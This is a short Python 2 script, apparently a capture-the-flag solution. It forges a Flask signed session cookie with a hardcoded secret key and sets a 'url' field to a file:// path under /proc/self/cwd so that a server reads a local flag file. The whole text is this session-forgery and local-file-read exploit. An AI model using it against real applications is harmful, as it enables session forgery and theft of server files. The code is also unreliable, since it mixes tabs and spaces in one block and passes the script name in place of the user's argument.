from flask import Flask
from flask.sessions import SecureCookieSessionInterface

import sys

def session_cookie_encoder(url):
    try:
	app = Flask(__name__)
	app.secret_key = 'v3ry_v3ry_s3cr37_k3y'

        session_cookie_structure = {"url" : url}
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error]{}".format(e)

if len(sys.argv) == 2:
	print session_cookie_encoder(sys.argv[0])
else:
	print session_cookie_encoder("file:///proc/self/cwd/flag")
